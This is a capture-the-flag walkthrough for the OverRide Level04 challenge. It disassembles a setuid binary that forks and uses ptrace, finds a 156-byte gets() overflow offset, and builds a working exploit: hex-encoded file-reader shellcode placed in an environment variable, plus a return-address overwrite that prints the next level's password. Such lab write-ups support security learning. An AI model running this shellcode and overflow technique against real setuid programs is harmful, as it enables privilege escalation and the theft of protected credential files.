# Level04

## Walkthrough

We list the files in the current home directory.

```bash
level04@OverRide:~$ ls -lA
total 17
-rw-r--r--  1 level04 level04  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level04 level04 3533 Sep 10  2016 .bashrc
-rw-r--r--+ 1 level04 level04   41 Oct 19  2016 .pass
-rw-r--r--  1 level04 level04  675 Sep 10  2016 .profile
-rwsr-s---+ 1 level05 users   7797 Sep 10  2016 level04
level04@OverRide:~$ file level04 
level04: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x7386c3c1bbd3e4d8fc85f88744379783bf327fd7, not stripped
```

The file `level04` is owned by **level05** and has the setuid bit.

We list the functions inside the executable.

```
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x0804845c  _init
0x080484a0  fflush
0x080484a0  fflush@plt
0x080484b0  gets
0x080484b0  gets@plt
0x080484c0  getchar
0x080484c0  getchar@plt
0x080484d0  signal
0x080484d0  signal@plt
0x080484e0  alarm
0x080484e0  alarm@plt
0x080484f0  wait
0x080484f0  wait@plt
0x08048500  puts
0x08048500  puts@plt
0x08048510  __gmon_start__
0x08048510  __gmon_start__@plt
0x08048520  kill
0x08048520  kill@plt
0x08048530  __libc_start_main
0x08048530  __libc_start_main@plt
0x08048540  prctl
0x08048540  prctl@plt
0x08048550  fork
0x08048550  fork@plt
0x08048560  __isoc99_scanf
0x08048560  __isoc99_scanf@plt
0x08048570  ptrace
0x08048570  ptrace@plt
0x08048580  _start
0x080485b0  __do_global_dtors_aux
0x08048610  frame_dummy
0x08048634  clear_stdin
0x08048657  get_unum
0x0804868f  prog_timeout
0x080486a0  enable_timeout_cons
0x080486c8  main
0x08048830  __libc_csu_init
0x080488a0  __libc_csu_fini
0x080488a2  __i686.get_pc_thunk.bx
0x080488b0  __do_global_ctors_aux
0x080488dc  _fini
```

There is 1 user-defined function: `main()`.

```
(gdb) disas main
Dump of assembler code for function main:
   0x080486c8 <+0>:     push   ebp
   0x080486c9 <+1>:     mov    ebp,esp
   0x080486cb <+3>:     push   edi
   0x080486cc <+4>:     push   ebx
   0x080486cd <+5>:     and    esp,0xfffffff0
   0x080486d0 <+8>:     sub    esp,0xb0
   0x080486d6 <+14>:    call   0x8048550 <fork@plt>
   0x080486db <+19>:    mov    DWORD PTR [esp+0xac],eax
   0x080486e2 <+26>:    lea    ebx,[esp+0x20]
   0x080486e6 <+30>:    mov    eax,0x0
   0x080486eb <+35>:    mov    edx,0x20
   0x080486f0 <+40>:    mov    edi,ebx
   0x080486f2 <+42>:    mov    ecx,edx
   0x080486f4 <+44>:    rep stos DWORD PTR es:[edi],eax
   0x080486f6 <+46>:    mov    DWORD PTR [esp+0xa8],0x0
   0x08048701 <+57>:    mov    DWORD PTR [esp+0x1c],0x0
   0x08048709 <+65>:    cmp    DWORD PTR [esp+0xac],0x0
   0x08048711 <+73>:    jne    0x8048769 <main+161>
   0x08048713 <+75>:    mov    DWORD PTR [esp+0x4],0x1
   0x0804871b <+83>:    mov    DWORD PTR [esp],0x1
   0x08048722 <+90>:    call   0x8048540 <prctl@plt>
   0x08048727 <+95>:    mov    DWORD PTR [esp+0xc],0x0
   0x0804872f <+103>:   mov    DWORD PTR [esp+0x8],0x0
   0x08048737 <+111>:   mov    DWORD PTR [esp+0x4],0x0
   0x0804873f <+119>:   mov    DWORD PTR [esp],0x0
   0x08048746 <+126>:   call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:   mov    DWORD PTR [esp],0x8048903
   0x08048752 <+138>:   call   0x8048500 <puts@plt>
   0x08048757 <+143>:   lea    eax,[esp+0x20]
   0x0804875b <+147>:   mov    DWORD PTR [esp],eax
   0x0804875e <+150>:   call   0x80484b0 <gets@plt>
   0x08048763 <+155>:   jmp    0x804881a <main+338>
   0x08048768 <+160>:   nop
   0x08048769 <+161>:   lea    eax,[esp+0x1c]
   0x0804876d <+165>:   mov    DWORD PTR [esp],eax
   0x08048770 <+168>:   call   0x80484f0 <wait@plt>
   0x08048775 <+173>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048779 <+177>:   mov    DWORD PTR [esp+0xa0],eax
   0x08048780 <+184>:   mov    eax,DWORD PTR [esp+0xa0]
   0x08048787 <+191>:   and    eax,0x7f
   0x0804878a <+194>:   test   eax,eax
   0x0804878c <+196>:   je     0x80487ac <main+228>
   0x0804878e <+198>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048792 <+202>:   mov    DWORD PTR [esp+0xa4],eax
   0x08048799 <+209>:   mov    eax,DWORD PTR [esp+0xa4]
   0x080487a0 <+216>:   and    eax,0x7f
   0x080487a3 <+219>:   add    eax,0x1
   0x080487a6 <+222>:   sar    al,1
   0x080487a8 <+224>:   test   al,al
   0x080487aa <+226>:   jle    0x80487ba <main+242>
   0x080487ac <+228>:   mov    DWORD PTR [esp],0x804891d
   0x080487b3 <+235>:   call   0x8048500 <puts@plt>
   0x080487b8 <+240>:   jmp    0x804881a <main+338>
   0x080487ba <+242>:   mov    DWORD PTR [esp+0xc],0x0
   0x080487c2 <+250>:   mov    DWORD PTR [esp+0x8],0x2c
   0x080487ca <+258>:   mov    eax,DWORD PTR [esp+0xac]
   0x080487d1 <+265>:   mov    DWORD PTR [esp+0x4],eax
   0x080487d5 <+269>:   mov    DWORD PTR [esp],0x3
   0x080487dc <+276>:   call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:   mov    DWORD PTR [esp+0xa8],eax
   0x080487e8 <+288>:   cmp    DWORD PTR [esp+0xa8],0xb
   0x080487f0 <+296>:   jne    0x8048768 <main+160>
   0x080487f6 <+302>:   mov    DWORD PTR [esp],0x8048931
   0x080487fd <+309>:   call   0x8048500 <puts@plt>
   0x08048802 <+314>:   mov    DWORD PTR [esp+0x4],0x9
   0x0804880a <+322>:   mov    eax,DWORD PTR [esp+0xac]
   0x08048811 <+329>:   mov    DWORD PTR [esp],eax
   0x08048814 <+332>:   call   0x8048520 <kill@plt>
   0x08048819 <+337>:   nop
   0x0804881a <+338>:   mov    eax,0x0
   0x0804881f <+343>:   lea    esp,[ebp-0x8]
   0x08048822 <+346>:   pop    ebx
   0x08048823 <+347>:   pop    edi
   0x08048824 <+348>:   pop    ebp
   0x08048825 <+349>:   ret
End of assembler dump.
```

The `main()` function:
- calls `fork()` to create a new process and compares the returned value to check if we are in the child or the parent
- in the child:
  - calls `prctl()`, with `PR_SET_PDEATHSIG` and `SIGKILL` as arguments, causing the child to terminate immediately if the parents process dies
  - calls `ptrace()` with `PTRACE_TRACEME` as request to indicate that this process is to be traced by its parent
  - calls `gets()` and stores user input in `[exp + 0x20]`
- in the parent:
  - calls `wait()` to suspend execution until the child process terminates
- calls `ptrace()` with `PTRACE_PEEKUSER` to read at an offset of `0x2c` (44) in the child user area (which holds the registers and other information about the process)
- calls `kill()` to kill the child process before the end of the program

The only instruction we can exploit is the `gets()` call in the child, probably with a buffer overflow. But because the parent calls `kill()`, we may not be able to call `system("/bin/sh")`.

First, we find the offset required to perform a buffer overflow in the child.

```
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 1660]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1660]
0x41326641 in ?? ()
```

The buffer overflow pattern generator finds an offset of 156 bytes.

Then we have to find an alternative shellcode to read the content of the `.pass` file without calling `system("/bin/sh")`. After some researches, we find one called *file reader*. We only have to append the path to the file we wanna read at the end of it, in our case `/home/users/level05/.pass`.

We store our shellcode inside an environment variable.

```bash
level04@OverRide:~$ export SHELLCODE=$(python -c "print('\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff' + '/home/users/level05/.pass')")
```

We find its address by writing and running a simple c program.

```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
  printf("%p\n", getenv("SHELLCODE"));
  return 0;
}
```

```bash
level04@OverRide:~$ cd /tmp/
level04@OverRide:/tmp$ mkdir getenv
level04@OverRide:/tmp$ cd getenv/
level04@OverRide:/tmp/getenv$ vim main.c
level04@OverRide:/tmp/getenv$ gcc -m32 main.c 
level04@OverRide:/tmp/getenv$ ./a.out 
0xffffd82b
```

Our environment variable is located at the address `0xffffd82b`.

To solve this level, we simply write 156 bytes to the buffer, followed by the address of the environment variable.

```bash
level04@OverRide:~$ python -c 'print("A" * 156 + "\x2b\xd8\xff\xff")' | ./level04 
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```

## Resources

- [set follow-fork-mode command](https://visualgdb.com/gdbreference/commands/set_follow-fork-mode)
- [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator)
- [File reader shellcode](https://shell-storm.org/shellcode/files/shellcode-73.html)
